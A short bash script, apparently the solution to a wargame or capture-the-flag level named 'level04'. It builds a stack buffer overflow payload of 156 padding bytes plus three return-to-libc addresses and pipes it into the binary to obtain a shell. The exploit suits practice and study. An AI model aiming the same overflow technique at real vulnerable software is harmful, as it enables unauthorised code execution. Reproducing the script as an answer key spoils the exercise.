#!/usr/bin/env bash

python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\xc4\x45\xee\xf7" + "\xec\x97\xf8\xf7"'  > /tmp/level04

cat /tmp/level04 - | ./level04
